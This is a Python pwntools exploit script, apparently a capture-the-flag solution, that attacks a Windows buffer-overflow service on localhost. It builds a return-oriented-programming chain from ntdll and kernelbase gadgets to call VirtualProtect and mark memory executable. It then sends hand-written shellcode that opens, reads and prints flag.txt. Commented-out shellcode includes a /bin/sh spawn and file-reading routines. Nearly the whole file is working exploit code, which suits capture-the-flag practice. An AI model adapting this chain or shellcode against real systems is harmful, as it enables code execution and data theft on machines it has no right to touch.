from pwn import *

context.clear(arch='amd64', os='windows')

p = remote("localhost", 31242)

msvcrt_addr = 0x00006ffffef60000
ntdll_addr = 0x00006fffffc50000
kernelbase_addr = 0x00006fffff430000

VirtualAlloc_addr = kernelbase_addr + 0x44cc8
VirtualProtect_addr = kernelbase_addr + 0x453E8


# ntdll's gadget
## rcx
pop_rcx_ret = ntdll_addr + 0x6b8f3 

## r8
pop_rax_ret = ntdll_addr + 0x175d4 
mov_r8_rax_mov_rax_r8_ret = ntdll_addr + 0x4bb14


# bof+25af : add r9, r11 ; mov rax, r9 ; ret
add_r9_r11_mov_rax_r9_ret = 0x1400025af 

## 1400014a2 : pop rbp ; ret
pop_rbp_ret = 0x1400014a2


# kernelbase+40313 : mov r11, qword ptr [rsp + 0x48] ; mov rcx, r11 ; call rbx
mov_r11_ptr_rsp_48_mov_rcx_r11_call_rbx = kernelbase_addr + 0x40313

# buf_addr = 0x7ffffe2ffeb0


pop_rbx_ret = 0x140001e26 

# kernelbase+15e90 : pop rdx ; ret
pop_rdx_ret = kernelbase_addr + 0x15e90



# bof+1534 : add rsp, 0x20 ; pop rbp ; ret
add_rsp_20_pop_rbp_ret = 0x140001534


GetString = 0x1400014A8


'''
    // Allocate memory with RWX permissions
    LPVOID allocatedMemory = VirtualAlloc(
        NULL,                           // System determines where to allocate
        memSize,                        // Size of the memory block
        MEM_COMMIT | MEM_RESERVE,       // MEM_COMMIT (0x1000) | MEM_RESERVE (0x2000)
        PAGE_EXECUTE_READWRITE          // RWX permissions: PAGE_EXECUTE_READWRITE (0x40)
    );

    DWORD flOldProtect = 0;
    BOOL change_protection = VirtualProtect(
        addr,                           //  0x140008000
        dwSize,                         //  0x1000 
        PAGE_EXECUTE_READWRITE,         //  0x40
        &flOldProtect                   //  ptr -> 0
    );
  
'''

rop_chain = [
    p64(pop_rcx_ret),
    p64(0x140008000), # 1st param
    p64(pop_rdx_ret),
    p64(0x1000), # 2nd param
    p64(pop_rax_ret),
    p64(0x40), # 3rd param
    p64(mov_r8_rax_mov_rax_r8_ret),
    p64(pop_rbx_ret),
    p64(add_rsp_20_pop_rbp_ret), # -> rbx
    p64(mov_r11_ptr_rsp_48_mov_rcx_r11_call_rbx),
    p64(0),
    p64(0),
    p64(0),
    p64(0x140008c00), # new rbp
    p64(add_r9_r11_mov_rax_r9_ret),
    p64(VirtualProtect_addr),            
    p64(add_rsp_20_pop_rbp_ret), 
    p64(0),
    p64(0),
    p64(0x140008f00), # 4th param; 
    p64(0),
    p64(0x140008a10), 
    p64(GetString), # write "flag.txt\x00" and shellcode to [rbp-0x10]
    p64(0x140008c00),
    p64(0x140008a30), # ret to shellcode
]

payload = b"A"*0x18 + b"".join(rop_chain) 

p.recvuntil(b"try to input something: ")
p.sendline(payload)

# linux_get_shell = b"\x48\x31\xC0\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05"
# payload = linux_get_shell


# open_file = b"\x48\x31\xC0\x48\xBF\x66\x6C\x61\x67\x2E\x74\x78\x74\x57\x48\x89\xE7\x48\x31\xF6\xB0\x02\x0F\x05\x48\x89\xC7"
# exit_ = b"\x48\x31\xFF\xB0\x3C\x0F\x05"
# payload = b"\x00"*0x20 + exit_ + b"aaaaaaa"

# GetStdHandle = kernelbase_addr + 0x5B178
# CreateFileA = kernelbase_addr + 0x1A2E8
# ReadFile = kernelbase_addr + 0x22B58
# WriteFile = kernelbase_addr + 0x23C98
# RtlExitUserProcess = kernelbase_addr + 0x8B7C0
# GetFileAttributesA = kernelbase_addr + 0x1D098

# print(f"GetStdHandle: {hex(GetStdHandle)}")
# print(f"CreateFileA: {hex(CreateFileA)}")
# print(f"ReadFile: {hex(ReadFile)}")
# print(f"WriteFile: {hex(WriteFile)}")
# print(f"RtlExitUserProcess: {hex(RtlExitUserProcess)}")
# print(f"GetFileAttributesA: {hex(GetFileAttributesA)}")


fopen = msvcrt_addr + 0x23560
fread = msvcrt_addr + 0x23BB0

print(f"fopen: {hex(fopen)}")
print(f"fread: {hex(fread)}")

input("@")

windows_flag = b"Z:\\home\\user\\flag.txt".ljust(0x20, b"\x00")
file_mode = b"r".ljust(0x10, b"\x00")
# get_std_handle = b"\x48\x31\xD2\x41\xB8\xF5\xFF\xFF\xFF\x49\xBF\x78\xB1\x48\xFF\xFF\x6F\x00\x00\x41\xFF\xD7\x48\x89\xC6"
# create_file = b"\x48\xB9\x00\x8A\x00\x40\x01\x00\x00\x00\x48\xBA\x00\x00\x00\x80\x00\x00\x00\x00\x49\xC7\xC0\x01\x00\x00\x00\x4D\x31\xC9\x6A\x00\x68\x80\x00\x00\x00\x6A\x03\x49\xBF\xE8\xA2\x44\xFF\xFF\x6F\x00\x00\x41\xFF\xD7\x48\x89\xC7"
# read_file = b"\x48\xBA\x00\x8B\x00\x40\x01\x00\x00\x00\x49\xC7\xC0\x30\x00\x00\x00\x49\xB9\x30\x8B\x00\x40\x01\x00\x00\x00\x49\xBF\x58\x2B\x45\xFF\xFF\x6F\x00\x00\x41\xFF\xD7"
# write_file = b"\x48\x89\xF1\x48\xBA\x00\x8B\x00\x40\x01\x00\x00\x00\x49\xB8\x30\x8B\x00\x40\x01\x00\x00\x00\x4D\x31\xC9\x49\xBF\x98\x3C\x45\xFF\xFF\x6F\x00\x00\x41\xFF\xD7"
exit_process = b"\x48\x31\xC9\x49\xBF\xC0\xB7\x4B\xFF\xFF\x6F\x00\x00\x41\xFF\xD7"

# payload = windows_flag + \
#     get_std_handle + \
#     create_file + \
#     read_file + \
#     write_file + \
#     exit_process 

# get_file_attr = b"\x48\xB9\x00\x8A\x00\x40\x01\x00\x00\x00\x49\xBF\x98\xD0\x44\xFF\xFF\x6F\x00\x00\x41\xFF\xD7"

fopen = b"\x48\xB9\x00\x8A\x00\x40\x01\x00\x00\x00\x48\xBA\x20\x8A\x00\x40\x01\x00\x00\x00\x49\xBF\x60\x35\xF8\xFE\xFF\x6F\x00\x00\x41\xFF\xD7\x48\x89\xC6"
fread = b"\x48\xB9\x00\x8B\x00\x40\x01\x00\x00\x00\x48\xC7\xC2\x01\x00\x00\x00\x49\xC7\xC0\x40\x00\x00\x00\x49\x89\xF1\x49\xBF\xB0\x3B\xF8\xFE\xFF\x6F\x00\x00\x41\xFF\xD7"
printf_data = b"\x48\xB9\x00\x8B\x00\x40\x01\x00\x00\x00\x49\xBF\x50\x14\x00\x40\x01\x00\x00\x00\x41\xFF\xD7"

# payload = windows_flag + create_file + read_file + printf_data + exit_process
# payload = windows_flag + get_file_attr + b"aaaaaaaaaaaaaaaa" + read_file + printf_data + exit_process
payload = windows_flag + file_mode + fopen + fread + printf_data + exit_process



p.recvuntil(b"try to input something: ")
p.sendline(payload)

p.interactive()